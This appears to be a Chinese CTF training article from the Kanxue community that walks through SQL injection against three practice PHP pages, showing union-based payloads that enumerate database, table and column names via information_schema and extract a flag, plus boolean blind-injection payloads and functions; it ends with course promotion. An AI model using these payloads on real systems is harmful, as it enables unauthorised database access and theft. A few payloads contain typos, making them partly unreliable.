#  30小时教你玩转CTF-SQL注入漏洞实战分析入门   
Spider_008  看雪学苑   2023-08-28 17:59  
  
```
```  
  
  
◆系统：MacOs 22.5.0  
  
◆工具：firefox  
、visualStudioCode  
  
  
```
```  
  
  
◆有黑客在尝试拖库  
  
◆SQL注入漏洞分析与实操讲解  
  
  
```
```  
  
  
1.php整数型SQL注入训练；  
  
2.php字符型SQL注入训练；  
  
3.php盲注型SQL注入训练。![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EypynrdYjklcPjFZlUj8P1DOulFhHFRKlUMIoyT9doQqNLjn726cKMtstQP0sPiaSV2JGZCrJF8Fw/640?wx_fmt=png "")  
  
这三个案例目的均为获取数据库中的数据，可以从以下5步获取结果。  
> 判断注入位点、判断select列数、查库名、查表名、查列名  
  
###   
### 1.php 整数型SQL  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EypynrdYjklcPjFZlUj8P1gvuBPCotLBTSdVqrQ3Xd92VCdgW0ZbubKMUeBwWbgBzXicmiaQds7XAA/640?wx_fmt=png "")  
  
  
**判断注入位点**  
  
  
使用and 1=1和 and 1=0页面是否一致判断是否存在注入位点and 1=1如下： ![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EypynrdYjklcPjFZlUj8P1FmklxuowOjTZA245IyZtr1EpflBibiavSbAXJribsiackk9R5Jb1ww38iag/640?wx_fmt=png "")  
  
and 1=0 如下： ![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EypynrdYjklcPjFZlUj8P1ib78S7hLhMOWibtlTnf0RE4ibRTpVCbFmWNz2LDYgVm7ewrVciccnHaGxA/640?wx_fmt=png "")  
  
界面不一致，说明存在注入点。  
  
  
**判断select列数**  
  
使用order by确认列数(按第几列排序)，根据反馈结果确认列数。![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EypynrdYjklcPjFZlUj8P1tFyLPtXdSkLWmWia87wtXTW8ku071uZzIBA0xia5M8e0E2WOBOfj6Qqw/640?wx_fmt=png "")  
  
看到有三列，查数据库信息可以通过这三列获取。  
  
  
**查库名**  
  
  
在sql中我们查询database语句为 select * from *** where id =1  
  
那么拼接后的语句可以写为?id=1 union select 1,2,database()  
  
  
id=1 不显示数据 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EypynrdYjklcPjFZlUj8P1CGe5yYYfn8obbE46uE5kDuBqrSXofJoeTwuxY0y7Tibib3guAVicr9xpg/640?wx_fmt=png "")  
  
  
id=0正常显示 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EypynrdYjklcPjFZlUj8P1RZsE2oiboWErbJgJAM0JicklrOOMstlv47OxWOR2zRfrxfWa4Bicjp8QQ/640?wx_fmt=png "")  
  
  
说明使用id=0,可以保证把数据库位置让出来，让数据显示，需要判断哪些列在前端展示，最后查到库名为 ctf。  
  
  
**查表名**  
  
  
通过information_schema查询元数据，获取表名，列名但不包含用户的数据表信息、要注意我们表有好多个，但是我们把多个表合并为一行显示需要用到函数 group_concat(table_name)。  
  
  
拼接后的URL如下：  
  
  
?id=0 union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='ctf' ![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EypynrdYjklcPjFZlUj8P1twqdibJf56vEwoia4jUJGL9vG7YBwRRXQrm1gTM4sBqIS1iaj9ceIoNaA/640?wx_fmt=png "")  
  
查询到表名信息：answer,emails,referers,uagents,users。  
  
  
根据经验判断哪个表最敏感：answer。  
  
  
**查列名**  
  
  
通过information_schema.columns获取ctf库answer表的列名,还需要把多个列合并到一起 group_concat(column_name)。  
  
  
查询列的URL如下：  
  
  
?id=0 union select 1,2,group_concat(column_name) from information_schema.columns where table_name='answer'![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EypynrdYjklcPjFZlUj8P1BDzykVh1X6BfbRiatkHH3RNA94jUwnrnRzOtVDrjZzuppKmMoqBs1CQ/640?wx_fmt=png "")  
  
  
获取列名为flag。  
  
  
**查结果**  
  
  
根据 库（ctf）、表(answer)、列(flag) 查询出 结果  
  
  
?id=0 union select 1,2,flag from answer![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EypynrdYjklcPjFZlUj8P1jwBfDem8ibqsrzvmPq7PgBBQaoqYOwLXjHyxk7IhXC4RZLomc8aeicicg/640?wx_fmt=png "")  
  
###   
### 2.php 字符型SQL  
###   
### 判断注入位点  
###   
### and 1=1 和 and 1=0 发现界面一致，查看源码。  
###   
###   
###   
###  使用''过略，前端输入所有数据后端全部使用''，使用’#方式过略。  
###   
### 判断select列数  
###   
### 使用URL id=1’ order by 3#查询列数   
###   
  
- 查库名  
  
- ?id=1‘ union select 1,2,database()#  
  
- 查表名  
  
- ?id=0’ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema='ctf'#  
  
- 查列名  
  
- ?id=0’ union select 1,2,group_concat(column_name) from information_schema.columns where table_name='answer'#  
  
- 查结果  
  
- ?id=0’ union select 1,2,flag from answer#  
  
###   
### 3.php 盲注型SQL  
###   
### 当出现类似true,false回显表示布尔盲注，如下图查询有结果：  
###   
### 查询无结果   
### and 1=1 表示查询有结果   
### 当出现and 1=0为查询无结果   
  
像这种情况，按照如下思路：  
  
在没有效据回显的情况下，可以存在不同的页面内容回显。  
  
通常逐个爆破猜解，效率偏低。  
  
思路：利用回显的不同推测SQL语句执行的结果是True还是False。  
  
Payload: or select * from users where id='1' and (select length(database()))=1#  
  
  
**编写脚本**  
  
  
使用python写，有一些盲注常用函数：  
  
left(a,b)从左侧截取a的前b位：left(database(),1)>'s'  
  
substr(a,b,c)从b位置开始，截取字符串a的c长度  
  
mid(a,b,c)从位置b开始 ，截取字符串a的c位  
  
ascii() 将某个字符转换为 ascii 值：ascii(substr(user),1,1))=101#  
  
  
围绕功能点：  
  
判断注入位点  
  
判断select列数  
  
查库名  
  
查表名  
  
查列名  
  
结果 ![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EypynrdYjklcPjFZlUj8P1U3hiciaTASQpWd6RjanD40Lia0I9cQbkqicRSS59WHvgQHovCcuCILANMg/640?wx_fmt=png "")  
  
  
  
```
```  
  
  
```
```  
  
  
  
%s  
表示字符串输入，%d  
表示整数输入,用i、j  
构造payload  
，通过查询库名  
，表名  
，列名  
，最后查询flag  
来逐步循环获取结果,sql语句  
和前两种  
注入基本一致，这里直接使用select  
,没有union select限制列数。  
  
  
```
```  
  
  
**1.union select有回显，可以看到某些字段的回显结果**  
  
  
**2.union select操作过程**  
  
  
◆猜解出字段数目  
- union连接两个select，让两个语句同时执行，但需要左边的列数与右边的列数相等union select才能正确执行  
  
◆猜测表名，字段名  
  
  
◆注入得到结果  
  
  
**3.最方便的注入方式**  
  
  
◆union语句可以填充查询结果，并额外执行一次查询  
  
  
**4.字符串SQL，使用’#方式过略**  
  
****  
****  
[](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458514823&idx=4&sn=01d746ba81867dc990e5abd58436d199&chksm=b18ec50d86f94c1b8c61b8175817f9bb556eb1b41ae3d45af98bc7f2c85b08246892a8d22775&scene=21#wechat_redirect)  
  
**《30小时教你玩转CTF》今日更新**  
  
****  
**本次更新内容主要是讲解图片隐写分析与实操，内容包括PNG图片、JPG图片、GIF图片格式解析，以三个实例讲解了LSB隐写解题。**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EypynrdYjklcPjFZlUj8P1cHxdBsAPAaFibOwYIQSRztBKaibjsNibUS6cAPCC432mjCMnmGKuYUvUA/640?wx_fmt=png "")  
  
  
  
**课程目录**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EypynrdYjklcPjFZlUj8P1p0gnRUAZkicx8iaDYme4tufgETl8v6XSSD0SPbJG9uVM1ibr4icx4PyXpA/640?wx_fmt=png "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8FrpLdVrwFCyia90uIvbic0WVXIs0KqL5FsbOdkPClGzV2jKdIGwEPJG0WZib15K1ylJBJA2Btdn3qzQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
**立即购课：66.66**  
  
小白➡大神的养成之路  
  
教你深入浅出学攻防  
  
**《30小时教你玩转CTF》**  
  
现在就加入我们，一起探索网络安全的精彩世界吧！  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/1UG7KPNHN8EypynrdYjklcPjFZlUj8P1icvAhYuLtV2fxljpZPThTpKDu0OhlKAcAVtwdAlLvdoVsYZO1Rib2V5A/640?wx_fmt=png "")  
  
  
**看雪ID：Spider_008**  
  
https://bbs.kanxue.com/user-home-910293.htm  
  
*本文为看雪论坛优秀文章，由 Spider_008 原创，转载请注明来自看雪社区  
  
  
[](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458514823&idx=1&sn=a9ce32f7903daaa225e6d0f979f04bb6&chksm=b18ec50d86f94c1b86c0646edb01adea4fe11fdce342ddc366b999e4b70a442976390633ab7d&scene=21#wechat_redirect)  
  
  
  
**#****往期推荐**  
  
1、[在 Windows下搭建LLVM 使用环境](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458500602&idx=1&sn=4bcc2af3c62e79403737ce6eb197effc&chksm=b18e8d7086f9046631a74245c89d5029c542976f21a98982b34dd59c0bda4624d49d1d0d246b&scene=21#wechat_redirect)  
  
  
2、[深入学习smali语法](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458500599&idx=1&sn=8afbdf12634cbf147b7ca67986002161&chksm=b18e8d7d86f9046b55ff3f6868bd6e1133092b7b4ec7a0d5e115e1ad0a4bd0cb5004a6bb06d1&scene=21#wechat_redirect)  
  
  
3、[安卓加固脱壳分享](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458500598&idx=1&sn=d783cb03dc6a3c1a9f9465c5053bbbee&chksm=b18e8d7c86f9046a67659f598242acb74c822aaf04529433c5ec2ccff14adeafa4f45abc2b33&scene=21#wechat_redirect)  
  
  
4、[Flutter 逆向初探](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458500574&idx=1&sn=06344a7d18a72530077fbc8f93a40d8f&chksm=b18e8d5486f904424874d7308e840523ebfb2db20811d99e4b0249d42fa8e38c4e80c3f622c6&scene=21#wechat_redirect)  
  
  
5、[一个简单实践理解栈空间转移](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458500315&idx=1&sn=19b12ab150dd49325f93ae9d73aef0c4&chksm=b18e8c5186f90547f3b615b160d803a320c103d9d892c7253253db41124ac6993d83d13c5789&scene=21#wechat_redirect)  
  
  
6、[记一次某盾手游加固的脱壳与修复](http://mp.weixin.qq.com/s?__biz=MjM5NTc2MDYxMw==&mid=2458500165&idx=1&sn=b16710232d3c2799c4177710f0ea6d41&chksm=b18e8ccf86f905d9a0b6c2c40997e9b859241a4d7f798c4aeab21352b0a72b6135afce349262&scene=21#wechat_redirect)  
  
  
  
![](https://mmbiz.qpic.cn/mmbiz_jpg/Uia4617poZXP96fGaMPXib13V1bJ52yHq9ycD9Zv3WhiaRb2rKV6wghrNa4VyFR2wibBVNfZt3M5IuUiauQGHvxhQrA/640?wx_fmt=jpeg&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8FHJ5XNqGmzLUOYeEJc9zylullBt3UKTEQsoxy2icCZlrib0kGSnnibUmPhrtv1ic2HR4SZvjH2PiaQASw/640?wx_fmt=gif "")  
  
**球分享**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8FHJ5XNqGmzLUOYeEJc9zylullBt3UKTEQsoxy2icCZlrib0kGSnnibUmPhrtv1ic2HR4SZvjH2PiaQASw/640?wx_fmt=gif "")  
  
**球点赞**  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_gif/1UG7KPNHN8FHJ5XNqGmzLUOYeEJc9zylullBt3UKTEQsoxy2icCZlrib0kGSnnibUmPhrtv1ic2HR4SZvjH2PiaQASw/640?wx_fmt=gif "")  
  
**球在看**  
  
